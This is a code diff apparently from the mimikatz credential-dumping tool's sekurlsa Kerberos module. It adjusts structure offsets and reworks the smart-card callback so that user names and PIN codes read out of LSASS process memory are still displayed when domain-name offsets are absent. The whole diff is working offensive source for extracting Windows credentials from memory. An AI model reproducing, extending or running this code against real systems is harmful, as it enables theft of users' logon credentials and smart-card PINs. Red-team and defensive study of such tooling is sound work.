@@ -241,8 +241,8 @@ const KERB_INFOS kerbHelper[] = {
 		sizeof(KIWI_KERBEROS_KEYS_LIST_6),
 		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
 		sizeof(KERB_HASHPASSWORD_6),
-		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, sizeOfCurrentStruct),
-		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, names),
+		0,//FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, sizeOfCurrentStruct),
+		0,//FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, names),
 		sizeof(KIWI_KERBEROS_CSP_INFOS_10),
 	},
 };
@@ -284,7 +284,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_kerberos_generic(IN PKIWI_BASIC_SECU
 
 void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_passwords(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS LocalKerbSession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData)
 {
-	KIWI_GENERIC_PRIMARY_CREDENTIAL creds;
+	KIWI_GENERIC_PRIMARY_CREDENTIAL creds = {0};
 	PBYTE infosCsp;
 	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
 	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &hLocalMemory}, aLsassMemory = {*(PVOID *) ((PBYTE) LocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetSmartCard), pData->cLsass->hLsassMem};
@@ -298,15 +298,19 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_passwords(IN PKIWI_BASIC_SE
 			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, kerbHelper[KerbOffsetIndex].structCspInfosSize))
 			{
 				creds.UserName = *(PUNICODE_STRING) infosCsp;
-				creds.Domaine.Length = (USHORT)	(*(PDWORD) (infosCsp + kerbHelper[KerbOffsetIndex].offsetSizeOfCurrentStruct) - (kerbHelper[KerbOffsetIndex].offsetNames - kerbHelper[KerbOffsetIndex].offsetSizeOfCurrentStruct));
-				if(creds.Domaine.Buffer = (PWSTR) LocalAlloc(LPTR, creds.Domaine.Length))
+				if(kerbHelper[KerbOffsetIndex].offsetNames && kerbHelper[KerbOffsetIndex].offsetSizeOfCurrentStruct)
 				{
-					aLsassMemory.address = (PBYTE) aLsassMemory.address + kerbHelper[KerbOffsetIndex].offsetNames;
-					aLocalMemory.address = creds.Domaine.Buffer;
-					if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, creds.Domaine.Length))
-						kuhl_m_sekurlsa_genericCredsOutput(&creds, pData, KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE | ((pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT : 0));
-					LocalFree(creds.Domaine.Buffer);
+					creds.Domaine.Length = (USHORT)	(*(PDWORD) (infosCsp + kerbHelper[KerbOffsetIndex].offsetSizeOfCurrentStruct) - (kerbHelper[KerbOffsetIndex].offsetNames - kerbHelper[KerbOffsetIndex].offsetSizeOfCurrentStruct));
+					if(creds.Domaine.Buffer = (PWSTR) LocalAlloc(LPTR, creds.Domaine.Length))
+					{
+						aLsassMemory.address = (PBYTE) aLsassMemory.address + kerbHelper[KerbOffsetIndex].offsetNames;
+						aLocalMemory.address = creds.Domaine.Buffer;
+						kull_m_memory_copy(&aLocalMemory, &aLsassMemory, creds.Domaine.Length);
+					}
 				}
+				kuhl_m_sekurlsa_genericCredsOutput(&creds, pData, KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE | ((pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT : 0));
+				if(creds.Domaine.Buffer)
+					LocalFree(creds.Domaine.Buffer);
 			}
 			LocalFree(infosCsp);
 		}
